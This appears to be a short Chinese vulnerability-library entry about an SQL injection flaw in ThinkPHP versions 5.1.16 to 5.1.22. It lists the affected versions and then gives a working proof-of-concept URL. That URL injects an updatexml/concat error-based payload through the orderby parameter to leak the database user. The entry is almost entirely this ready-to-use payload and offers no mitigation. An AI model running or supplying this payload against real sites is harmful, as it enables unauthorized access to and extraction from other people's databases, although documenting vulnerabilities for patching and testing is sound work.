---
title: 'Thinkphp 5.1.(16-22) sql注入漏洞'
date: Wed, 07 Oct 2020 06:02:29 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞影响

5.1.16 <= ThinkPHP <= 5.1.22

### 漏洞POC

```
http://********/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 
```